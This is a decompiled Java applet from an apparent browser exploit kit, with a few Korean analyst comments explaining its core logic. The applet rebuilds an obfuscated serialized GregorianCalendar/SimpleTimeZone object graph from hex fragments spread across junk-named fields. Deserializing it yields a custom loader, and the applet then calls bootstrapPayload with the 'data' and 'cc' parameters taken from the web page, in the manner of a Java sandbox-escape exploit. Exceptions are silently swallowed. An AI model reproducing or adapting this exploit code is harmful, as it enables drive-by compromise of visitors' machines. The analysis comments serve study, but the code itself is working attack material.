// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   AppletX.java

package myf.y;

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

// Referenced classes of package myf.y:
//            PX, LoaderX

public class AppletX extends Applet
{

    public AppletX()
    {
        serializedObject = (new StringBuilder()).append("ACED").append(ff).append("269616E").append(a34).append("00A").toString();
    }

    public void init()
    {
        try
        {
            String s = "000000";
            String s1 = "5469";
            String s2 = (new StringBuilder()).append("0010677265676F7269616E4375746F766572787200126A6176612E7574696C2E43616C656E646172E6EA4D1EC8DC5B8E03000B5A000C6172654669656C647353657449000E66697273744461794F665765656B5A00096973").append(s1).append("6D655365745A00076C656E69656E744900166D696E696D616C44617973496E46697273745765656B4900096E6578745374616D7049001573657269616C56657273696F6E4F6E53747265616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047A6F6E657400144C6A6176612F7574696C2F").append(s1).append("6D655A6F6E653B787001").append(s).append("010101").append(s).append("01").append(s).append("02").append(s).append("0100000121563A").toString();
            String s3 = (new StringBuilder()).append("200014A").append(s2).append("FC0E757200025B494DBA602676EAB2A5020000787").append(s).append("011").append(s).append("01000007D9").append(s).append("04").append(s).append("15").append(s).append("04").append(s).append("12").append(s).append("8A").append(s).append("02").append(s).append("03").append(s).append("01").append(s).append("04").append(s).append("1").append(s).append("011").append(s).append("22000002DEFE488C").append(s).append("0000757200025B5A578F203914B85DE2020000787").append(s).append("0110101010101010").toString();
            String s4 = (new StringBuilder()).append("6444617949000C656E644461794F665765656B490007656E644D6F6465490008656E644D6F6E7468490007656E64").append(s1).append("6D6549000B656E64").append(s1).append("6D654D6F64654900097261774F666673657449001573657269616C56657273696F6E4F6E53747265616D490008737461727444617949000E73746172744461794F665765656B49000973746172744D6F646549000A73746172744D6F6E74684900097374617274").append(s1).append("6D6549000D7374617274").append(s1).append("6D654D6F64654900097374617274596561725A000B7573654461796C696768745B000B6D6F6E74684C656E6774687400025B42787200126A6176612E7574696C2E").append(s1).append("6D655A6F6E6531B3E9F57744ACA10200014C000249447400124C6A6176612F6C616E672F537472696E673B787074000E416D65726963612F446177736F6E0036EE8").append(s).append("000000000").append(s).append("000000").append(s).append("000000").append(s).append("0000FE4").toString();
            ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(PX.StringToBytes((new StringBuilder()).append("ACED00057372001B6A6176612E7574696C2E477265676F7269616E43616C656E6461728F3DD7D6E5B0D0C10").append(s3).append("101010101010101010101737200186A6176612E7574696C2E53696D706C65").append(s1).append("6D655A6F6E65FA675D60D15EF5A603001249000A647374536176696E6773490006656E").append(s4).append("88C").append(s).append("0002").append(s).append("000000").append(s).append("000000").append(s).append("000000").append(s).append("000000").append(s).append("0000757200025B42ACF317F8060854E0020000787").append(s).append("00C1F1C1F1E1F1E1F1F1E1F1E1F770A").append(s).append("06").append(s).append("0000007571007E0006").append(s).append("02").append(s).append("0000000000787372000D6D79662E792E4C6F61646572585E8B4C67DDC409D8020000787078FFFFF4E2F964AC000A").toString())));
            Object obj = objectinputstream.readObject();
            if(obj != null && LoaderX.instance != null)
            {
            	//AppletX.class 파일에서 핵심적인 코드
            	//getParameter()함수는 사용자로 부터 입력받기 위한 함수이며, 
            	//입력받은 data와 cc값을 LoadX클래스의 bootstrapPayload()함수로 전달하고 있습니다.
                String s5 = getParameter("data");
                String s6 = getParameter("cc");
                if(s5 == null)
                    s5 = "";
                LoaderX.instance.bootstrapPayload(s5, s6);
            }
        }
        catch(Exception exception) { }
    }

    private static final long serialVersionUID = 0xd30f41af207ff1c8L;
    private static String ff = "00057372001B6A6176612E7574696C2E477265676F7";
    private static String as;
    private static String afc;
    private static String afcdsnhbskjdbfsdhbfsjkdlnknbaskjbadjha;
    private static String afcFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFha;
    private static String lol;
    private static String kol;
    private static String gGGGGGGGGLGKGFJDHFDfdfgdhgfsjgfjsdgf7sgfjsdgfhgdf7ysgdfj;
    private static String kkk;
    private static String asa;
    private static String abc;
    private static String a5 = "sdfsd fsdf hsd fkjw fekwe gfrjkg kj54 tkj nkj4 609hyi9h0009e433333333333333333333333333333333333349tugreo9ug 9rugjjjjjjj9 woiuwwwwwwwwwwwwwwwwwwuqrfj 29fu 09epwoooooooooog poreig iorehg oia;sjhdfiosjgf dhhhhhhhhhhhhh";
    private static String klls;
    private static String a1;
    private static String a2;
    private static String a31;
    private static String a32;
    private static String a33;
    public static String a34;
    private final String serializedObject;
    public static String data = null;

    static 
    {
        as = "00000";
        afc = "44461794";
        afcdsnhbskjdbfsdhbfsjkdlnknbaskjbadjha = "646549000";
        afcFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFha = "6E69656E744900166D696E696D616C44617973496E46697273745765656B4900096E6578745374616D7049001573657269616C56657273696F6E4F6E53747265616D4A000474696D655B00066669656C64737400025B495B000569735365747400025B5A4C00047A6F6E657400144C6A6176612F7574696C2F54696D655A6";
        lol = "73657269616C56657273696F6E4F6E53747265616D4900087";
        kol = "6F6E7468490007656E6454696D6549000B656E6454696D6";
        gGGGGGGGGLGKGFJDHFDfdfgdhgfsjgfjsdgf7sgfjsdgfhgdf7ysgdfj = "4596561725A000B7573654461796C696768745B000B6D6F6E74684C656E6774687400025B42787200126A6176612E7574696C2E54696D655A6F6E6531B3E9F57744ACA10200014C000249447400124C6A6176612F6C616E672F537472696E673B787074000E4";
        kkk = "2744D6F6E7468490009737461727454696D6549000D7374617";
        asa = "010101010101010101737200186A6176612E7574696C2E53696D706C6554696D655A6F6E65FA675D60D15EF5A603001249000A64737453";
        abc = "B0D0C10200014A0010677265676F7269616E4375746F766572787200126A6176612E7574696C2E43616C656E646172E6EA4D1EC8DC5B8E03000B5A000C6172654669656C647353657449";
        klls = (new StringBuilder()).append("87001").append(as).append("0010101").append(as).append("001").append(as).append("002").append(as).append("001").append(as).append("121563AFC0E757200025B494DBA602676EAB2A5020000787").append(as).append("0011").append(as).append("001").append(as).append("7D9").append(as).append("004").append(as).append("015").append(as).append("004").append(as).append("012").append(as).append("08A").append(as).append("002").append(as).append("003").append(as).append("001").append(as).append("004").append(as).append("01").append(as).append("0011").append(as).append("022").append(as).append("2DEFE488C").append(as).append("00000757200025B5A578F203914B85DE2020000787").append(as).append("00110101010101010101").append(asa).append("6176696E6773490006656E6").append(afc).append("9000C656E6").append(afc).append("F665765656B490007656E644D6F").append(afcdsnhbskjdbfsdhbfsjkdlnknbaskjbadjha).append("8656E644D").append(kol).append("54D6F").append(afcdsnhbskjdbfsdhbfsjkdlnknbaskjbadjha).append("97261774F6666736574490015").append(lol).append("37461727").append(afc).append("9000E737461727").append(afc).append("F665765656B49000973746172744D6F").append(afcdsnhbskjdbfsdhbfsjkdlnknbaskjbadjha).append("A73").toString();
        a1 = (new StringBuilder()).append("0007571007E0006").append(as).append("002").append(as).append("00000000000787372000D6D79662E792E4C6F61646572585E8B4C67DDC409D8020000787078FFFFF4E").toString();
        a2 = (new StringBuilder()).append("61727").append(gGGGGGGGGLGKGFJDHFDfdfgdhgfsjgfjsdgf7sgfjsdgfhgdf7ysgdfj).append("16D65726963612F446177736F6E0036EE8").append(as).append("00000").append(as).append("00000").append(as).append("00000").append(as).append("00000").append(as).append("0000FE488C0000000002").append(as).append("00000").append(as).append("00000").append(as).append("00000").append(as).append("00000").append(as).append("00000").append(as).append("000757200025B42ACF317F8060854E002000078700000000C1F1C1F1E1F1E1F1F1E1F1E1F770A").append(as).append("006").append(as).append("0000").append(a1).append("2F96").toString();
        a31 = (new StringBuilder()).append("9697354696D655365745A00076C65").append(afcFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFha).append("F6E6").toString();
        a32 = (new StringBuilder()).append("000").append(a31).append("53B7").append(klls).append("74617").append(kkk).append("27454696D654D6F").append(afcdsnhbskjdbfsdhbfsjkdlnknbaskjbadjha).append("97374").append(a2).append("4A").toString();
        a33 = (new StringBuilder()).append("C656E6461728F3DD7D6E5").append(abc).append("000E666972737").append(afc).append("F665").toString();
        a34 = (new StringBuilder()).append("43616").append(a33).append("765656B5A").append(a32).append("C0").toString();
    }
}
